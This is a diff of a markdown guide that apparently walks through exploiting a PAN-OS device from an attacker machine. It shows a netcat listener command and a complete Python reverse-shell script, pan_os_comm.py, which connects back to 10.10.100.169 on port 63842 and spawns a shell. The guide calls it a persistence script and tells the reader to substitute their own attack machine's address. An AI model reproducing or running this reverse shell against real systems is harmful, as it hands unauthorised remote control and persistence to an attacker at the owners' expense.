@@ -8,27 +8,32 @@ nc -lvnp 63842
 
 ### 2. 📁 Create the Reverse Shell Script (ATTACKER)
 
-```bash
-sudo vim /tmp/pan_os_comm.py
+Persistence Script Setup:
+
+1. Perform the following command: nano pan_os_comm.py
+2. In nano, copy and paste the below script: ***NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :) *** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.
+
 ```
+#!/usr/bin/env python3
 
-`i`
-```python
-usr/bin/env python3 
+import socket
+import subprocess
+import os
+import pty
 
-import socket,subprocess,os;
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.100.169",63842));
+s.connect(("10.10.100.169", 63842))
 
-os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(), 0)
 
-os.dup2(s.fileno(),1);
+os.dup2(s.fileno(), 1)
 
-os.dup2(s.fileno(),2);
+os.dup2(s.fileno(), 2)
 
-import pty; pty.spawn("sh")
+pty.spawn("sh")
+
 ```
-`:wq!`
 
 ```bash
 cd /tmp
